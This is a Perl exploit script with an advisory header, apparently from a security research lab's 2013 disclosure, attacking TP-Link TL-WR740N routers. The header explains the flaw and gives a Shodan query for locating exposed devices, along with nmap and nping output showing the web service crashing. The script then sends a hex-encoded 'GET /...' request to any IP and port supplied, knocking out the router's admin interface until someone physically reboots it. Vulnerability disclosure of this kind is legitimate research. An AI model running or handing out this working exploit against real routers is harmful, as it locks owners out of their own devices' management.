#!/usr/local/bin/perl
#
#
# TP-Link TL-WR740N Wireless Router Remote Denial Of Service Exploit
#
#
# Vendor: TP-LINK Technologies Co., Ltd.
# Product web page: http://www.tp-link.us
#
# Affected version:
#
# - Firmware version: 3.16.4 Build 130205 Rel.63875n (Released: 2/5/2013)
# - Hardware version: WR740N v4 00000000 (v4.23)
# - Model No. TL-WR740N / TL-WR740ND
#
# Summary: The TL-WR740N is a combined wired/wireless network connection
# device integrated with internet-sharing router and 4-port switch. The
# wireless N Router is 802.11b&g compatible based on 802.11n technology
# and gives you 802.11n performance up to 150Mbps at an even more affordable
# price. Bordering on 11n and surpassing 11g speed enables high bandwidth
# consuming applications like video streaming to be more fluid.
#
# Desc: The TP-Link WR740N Wireless N Router network device is exposed to a
# remote denial of service vulnerability when processing a HTTP request. This
# issue occurs when the web server (httpd) fails to handle a HTTP GET request
# over a given default TCP port 80. Sending a sequence of three dots (...) to
# the router will crash its httpd service denying the legitimate users access
# to the admin control panel management interface. To bring back the http srv
# and the admin UI, a user must physically reboot the router.
#
#
# ============================== Playground: ==============================
#
# Shodan: WWW-Authenticate: Basic realm="TP-LINK Wireless Lite N Router WR740N"
#
# # nmap -sV 192.168.0.1
#
# Starting Nmap 6.01 ( http://nmap.org ) at 2013-03-19 04:53 Central European Standard Time
# Nmap scan report for 192.168.0.1
# Host is up (0.00s latency).
# Not shown: 999 closed ports
# PORT   STATE SERVICE VERSION
# 80/tcp open  http    TP-LINK WR740N WAP http config
# MAC Address: AA:BB:CC:DD:EE:FF (Tp-link Technologies CO.)
# Service Info: Device: WAP
#
# Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
#
# --------------------------------------------------------------------------
# Changed Probe Directive in nmap-service-probes file [4 d range]:
# - Line: 4682: Probe TCP GetRequest q|GET / HTTP/1.0\r\n\r\n|
# + Line: 4682: Probe TCP GetRequest q|GET /... HTTP/1.0\r\n\r\n|
# --------------------------------------------------------------------------
#
# # nping -c1 --tcp -p80 192.168.0.1 --data "474554202f2e2e2e20485454502f312e310d0a0d0a"
#
# Starting Nping 0.6.01 ( http://nmap.org/nping ) at 2013-03-19 04:55 Central European Standard Time
# SENT (0.0920s) TCP 192.168.0.101:19835 > 192.168.0.1:80 S ttl=64 id=21796 iplen=61  seq=1961954057 win=1480
# RCVD (0.1220s) TCP 192.168.0.1:80 > 192.168.0.101:19835 RA ttl=64 id=0 iplen=40  seq=0 win=0
#
# Max rtt: 0.000ms | Min rtt: 0.000ms | Avg rtt: 0.000ms
# Raw packets sent: 1 (75B) | Rcvd: 1 (46B) | Lost: 0 (0.00%)
# Tx time: 0.04000s | Tx bytes/s: 1875.00 | Tx pkts/s: 25.00
# Rx time: 1.04000s | Rx bytes/s: 44.23 | Rx pkts/s: 0.96
# Nping done: 1 IP address pinged in 1.12 seconds
#
# --------------------------------------------------------------------------
#
# # nmap -Pn 192.168.0.1 -p80
#
# Starting Nmap 6.01 ( http://nmap.org ) at 2013-03-19 04:57 Central European Standard Time
# Nmap scan report for 192.168.0.1
# Host is up (0.00s latency).
# PORT   STATE  SERVICE
# 80/tcp closed http
# MAC Address: AA:BB:CC:DD:EE:FF (Tp-link Technologies CO.)
#
# Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
#
# ============================= !Playground ===============================
#
#
# Tested on: Router Webserver
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Copyleft (c) 2013, Zero Science Lab
# Macedonian Information Security Research And Development Laboratory
# http://www.zeroscience.mk
#
#
# Advisory ID: ZSL-2013-5135
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5135.php
#
#
# 17.03.2013
#

use IO::Socket;

$ip="$ARGV[0]"; $port="$ARGV[1]";

print "\n\n\x20"."\x1f"x42 ."\n";
print "\x20\x1f"."\x20"x40 ."\x1f\n";
print "\x20\x1f  TP-Link TL-WR740N httpd DoS Exploit   \x1f\n";
print "\x20\x1f"."\x20"x40 ."\x1f\n";
print "\x20\x1f"."\x20"x7 ."\x16"x5 ."\x20"x15 ."\x16"x5 ."\x20"x8 ."\x1f\n";
print "\x20\x1f"."\x20"x9 ."\x16"."\x20"x19 ."\x16"."\x20"x10 ."\x1f\n";
print "\x20" ."\x1f"x42 ."\n";
print "\x20\x4" ."\x20"x40 ."\x4\n";
print "\x20" ."\x1e" x 42 ."\n";

if($#ARGV<1)
{
   print "\n\n\x20\x20\x1a\x20Usage: $0 <ip> <port>\n\n";
   exit();
}

$socket=IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => $ip,
PeerPort => $port
);

$ta4ke="\x47\x45\x54\x20".
       "\x2f\x2e\x2e\x2e".
       "\x20\x48\x54\x54".
       "\x50\x2f\x31\x2e".
       "\x31\x0d\x0a\x0d".
       "\x0a";

print "\n\x20\x1a\x20Sending evil payload...\n"; sleep 2;
print $socket "$ta4ke"; sleep 5; close $socket;
print "\x20\x1a\x20HTTPd successfully poked.\n"; sleep 2;
print "\x20\x1a\x20Verifying with Nmap...\n"; sleep 2;
system("nmap -Pn $ip -p $port");
print "\n\x20\x1a\x20Playing goa-psy...\n"; sleep 2;
system("start C:\\Progra~1\\Winamp\\winamp.exe http://scfire-ntc-aa01.stream.aol.com:80/stream/1008");
sleep 1; print "\x20\x1a\x20All Done!\n"; sleep 1;

# Codename: Threetwoees